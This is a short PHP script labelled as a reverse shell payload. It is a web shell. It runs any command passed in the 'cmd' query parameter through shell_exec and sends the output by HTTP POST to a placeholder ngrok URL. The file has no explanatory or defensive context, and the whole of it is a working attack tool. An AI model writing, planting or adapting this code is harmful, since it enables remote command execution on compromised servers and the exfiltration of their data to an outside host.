<?php
// Reverse shell payload
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);

// Send the output to a remote server
$remoteServer = 'http://your-ngrok-url.ngrok.io/receive-output.php';
$data = array('output' => $output);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($remoteServer, false, $context);
?>
